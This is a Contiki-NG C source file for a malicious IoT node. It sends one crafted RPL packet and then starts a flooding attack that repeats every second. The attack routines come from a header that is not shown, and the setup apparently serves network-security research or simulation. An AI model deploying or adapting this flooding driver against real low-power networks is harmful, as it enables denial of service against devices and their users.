#include "contiki.h"
#include "random.h"
#include "net/netstack.h"
#include "net/routing/rpl-lite/rpl-timers.h"
#include "net/routing/rpl-lite/rpl-icmp6-malicious.h"
//#define LOG_MODULE "Node"
#define LOG_LEVEL LOG_LEVEL_INFO
#define SEND_INTERVAL		  (30 * CLOCK_SECOND)
#define ATTACK_START          SEND_INTERVAL
/*---------------------------------------------------------------------------*/
PROCESS(udp_client_process, "UDP client");
PROCESS(flooding_process, "Flooding");
AUTOSTART_PROCESSES(&udp_client_process);
/*---------------------------------------------------------------------------*/

PROCESS_THREAD(udp_client_process, ev, data)
{
  static struct etimer periodic_timer;
  static bool first = true;
  PROCESS_BEGIN();
  
  /* Init of flooding node stats */
  init_flood();
  
  etimer_set(&periodic_timer, SEND_INTERVAL);
  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));
    //We just want to send the RPL packet once
    if (first) {
        first = false;
        malicious_output();
    }
    else { //in the next timer expiration, start flood attack process & stop this timer
        etimer_stop(&periodic_timer);    
        process_start(&flooding_process, NULL);
    }
    /* Add some jitter */
    etimer_set(&periodic_timer, SEND_INTERVAL
      - CLOCK_SECOND + (random_rand() % (2 * CLOCK_SECOND)));
  }
  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(flooding_process, ev, data)
{
  static struct etimer timer;
  PROCESS_BEGIN();
  
  flooding = true; //flooding mode on

  etimer_set(&timer, SEND_INTERVAL);
  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));
    if (flooding) {
        /* Launch attack */
        launch_flooding_attack();
        etimer_reset_with_new_interval(&timer, CLOCK_SECOND);
    }
  }
  PROCESS_END();
}
